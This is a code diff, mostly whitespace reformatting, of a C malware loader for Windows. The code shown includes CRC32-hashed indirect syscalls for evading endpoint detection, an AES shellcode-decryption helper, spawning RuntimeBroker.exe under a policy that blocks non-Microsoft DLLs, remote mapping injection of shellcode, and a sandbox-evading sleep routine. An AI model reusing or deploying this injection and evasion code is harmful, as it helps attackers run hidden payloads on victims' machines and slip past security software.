@@ -99,21 +99,21 @@ BOOL InstallAesDecryptionViaCtAes(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherT
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
 
 // Calculated CRC Hash Values
-#define NtCreateUserProcess_CRC32			0x2B09FF3F
+#define NtCreateUserProcess_CRC32		0x2B09FF3F
 
 typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
-	PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
-	PUNICODE_STRING					ImagePathName,
-	PUNICODE_STRING					DllPath,
-	PUNICODE_STRING					CurrentDirectory,
-	PUNICODE_STRING					CommandLine,
-	PVOID							Environment,
-	PUNICODE_STRING					WindowTitle,
-	PUNICODE_STRING					DesktopInfo,
-	PUNICODE_STRING					ShellInfo,
-	PUNICODE_STRING					RuntimeData,
-	ULONG							Flags
-	);
+	PRTL_USER_PROCESS_PARAMETERS* 		pProcessParameters,
+	PUNICODE_STRING				ImagePathName,
+	PUNICODE_STRING				DllPath,
+	PUNICODE_STRING				CurrentDirectory,
+	PUNICODE_STRING				CommandLine,
+	PVOID					Environment,
+	PUNICODE_STRING				WindowTitle,
+	PUNICODE_STRING				DesktopInfo,
+	PUNICODE_STRING				ShellInfo,
+	PUNICODE_STRING				RuntimeData,
+	ULONG					Flags
+);
 
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
 
@@ -143,21 +143,21 @@ BOOL BlockDllPolicyViaNtCreateUserProcess(IN LPWSTR szProcessPath, IN OPTIONAL L
 	if (!szProcessPath || !szProcessParms || !phProcess || !phThread)
 		return FALSE;
 
-	BOOL							bResult = FALSE;
-	fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx = NULL;
-	NTSTATUS						STATUS = 0x00;
-	PPS_ATTRIBUTE_LIST				pAttributeList = NULL;
-	PRTL_USER_PROCESS_PARAMETERS	pUserProcessParams = NULL;
-	PWCHAR							pwcDuplicateStr = NULL,
-		pwcLastSlash = NULL,
-		pszNtProcessPath = NULL,
-		pszFullProcessParm = NULL;
-	UNICODE_STRING					NtImagePath = { 0 },
-		ProcCommandLine = { 0 },
-		ProcCurrentDir = { 0 };
-	PS_CREATE_INFO					PsCreateInfo = { 0 };
-	NT_SYSCALL						NtCreateUserProcess = { 0 };
-	DWORD64                         dw64BlockDllPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+	BOOL				bResult 			= FALSE;
+	fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx 	= NULL;
+	NTSTATUS			STATUS 				= 0x00;
+	PPS_ATTRIBUTE_LIST		pAttributeList	 		= NULL;
+	PRTL_USER_PROCESS_PARAMETERS	pUserProcessParams 		= NULL;
+	PWCHAR				pwcDuplicateStr 		= NULL,
+					pwcLastSlash 			= NULL,
+					pszNtProcessPath 		= NULL,
+					pszFullProcessParm 		= NULL;
+	UNICODE_STRING			NtImagePath 			= { 0 },
+					ProcCommandLine 		= { 0 },
+					ProcCurrentDir 			= { 0 };
+	PS_CREATE_INFO			PsCreateInfo 			= { 0 };
+	NT_SYSCALL			NtCreateUserProcess 		= { 0 };
+	DWORD64                         dw64BlockDllPolicy 		= PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
 
 	if (!FetchNtSyscall(NtCreateUserProcess_CRC32, &NtCreateUserProcess)) {
 		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateUserProcess \n");
@@ -198,6 +198,7 @@ BOOL BlockDllPolicyViaNtCreateUserProcess(IN LPWSTR szProcessPath, IN OPTIONAL L
 		wsprintfW(pszFullProcessParm, L"%s %s", szProcessPath, szProcessParms);
 	else
 		wsprintfW(pszFullProcessParm, L"%s", szProcessPath);
+	
 	RtlInitUnicodeString(&NtImagePath, pszNtProcessPath);
 	RtlInitUnicodeString(&ProcCommandLine, pszFullProcessParm);
 	RtlInitUnicodeString(&ProcCurrentDir, pwcDuplicateStr);
@@ -207,17 +208,17 @@ BOOL BlockDllPolicyViaNtCreateUserProcess(IN LPWSTR szProcessPath, IN OPTIONAL L
 		goto _END_OF_FUNC;
 	}
 
-	pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) + 2 * sizeof(PS_ATTRIBUTE);
-	pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
-	pAttributeList->Attributes[0].Size = NtImagePath.Length;
-	pAttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;
+	pAttributeList->TotalLength 			= sizeof(PS_ATTRIBUTE_LIST) + 2 * sizeof(PS_ATTRIBUTE);
+	pAttributeList->Attributes[0].Attribute 	= PS_ATTRIBUTE_IMAGE_NAME;
+	pAttributeList->Attributes[0].Size 		= NtImagePath.Length;
+	pAttributeList->Attributes[0].Value 		= (ULONG_PTR)NtImagePath.Buffer;
 
-	pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
-	pAttributeList->Attributes[1].Size = sizeof(DWORD64);
-	pAttributeList->Attributes[1].Value = &dw64BlockDllPolicy;
+	pAttributeList->Attributes[1].Attribute 	= PS_ATTRIBUTE_MITIGATION_OPTIONS;
+	pAttributeList->Attributes[1].Size 		= sizeof(DWORD64);
+	pAttributeList->Attributes[1].Value 		= &dw64BlockDllPolicy;
 
-	PsCreateInfo.Size = sizeof(PS_CREATE_INFO);
-	PsCreateInfo.State = PsCreateInitialState;
+	PsCreateInfo.Size 				= sizeof(PS_CREATE_INFO);
+	PsCreateInfo.State 				= PsCreateInitialState;
 
 	SET_SYSCALL(NtCreateUserProcess);
 	if (!NT_SUCCESS((STATUS = RunSyscall(phProcess, phThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0x00, 0x00, pUserProcessParams, &PsCreateInfo, pAttributeList)))) {
@@ -246,7 +247,7 @@ _END_OF_FUNC:
 #define NtCreateThreadEx_CRC32				0x6411D915
 #define NtWaitForSingleObject_CRC32			0x3D93EDA4
 #define NtUnmapViewOfSection_CRC32			0x830A04FC
-#define NtClose_CRC32						0x0EDFC5CB
+#define NtClose_CRC32					0x0EDFC5CB
 
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
 
@@ -305,8 +306,8 @@ BOOL InitializeNtSyscalls() {
 ULONG64 SharedTimeStamp() {
 
 	LARGE_INTEGER TimeStamp = {
-		.LowPart = USER_SHARED_DATA->SystemTime.LowPart,
-		.HighPart = USER_SHARED_DATA->SystemTime.High1Time
+		.LowPart 	= USER_SHARED_DATA->SystemTime.LowPart,
+		.HighPart 	= USER_SHARED_DATA->SystemTime.High1Time
 	};
 
 	return TimeStamp.QuadPart;
@@ -326,14 +327,14 @@ VOID SharedSleep(IN ULONG64 uMilliseconds) {
 
 BOOL RemoteMappingInjectionViaIndirectSyscalls(IN HANDLE hProcess, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {
 
-	BOOL			bResult = FALSE;
-	NTSTATUS		STATUS = 0x00;
-	PBYTE			pLocalTmpAddress = NULL,
-		pRemoteTmpAddress = NULL;
-	HANDLE			hSection = NULL,
-		hThread = NULL;
-	SIZE_T			sViewSize = 0x00;
-	LARGE_INTEGER	MaximumSize = { .LowPart = sShellcodeSize };
+	BOOL			bResult 		= FALSE;
+	NTSTATUS		STATUS 			= 0x00;
+	PBYTE			pLocalTmpAddress 	= NULL,
+				pRemoteTmpAddress 	= NULL;
+	HANDLE			hSection 		= NULL,
+				hThread 		= NULL;
+	SIZE_T			sViewSize 		= 0x00;
+	LARGE_INTEGER		MaximumSize 		= { .LowPart = sShellcodeSize };
 
 	if (!hProcess || !pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
 		return FALSE;
@@ -436,7 +437,7 @@ _END_OF_FUNC:
 int main() {
 
 	HANDLE	hProcess	= NULL,
-			hThread		= NULL;
+		hThread		= NULL;
 
 	if (!BlockDllPolicyViaNtCreateUserProcess(L"C:\\Windows\\System32\\RuntimeBroker.exe", L"-Embedding", &hProcess, &hThread))
 		return -1;
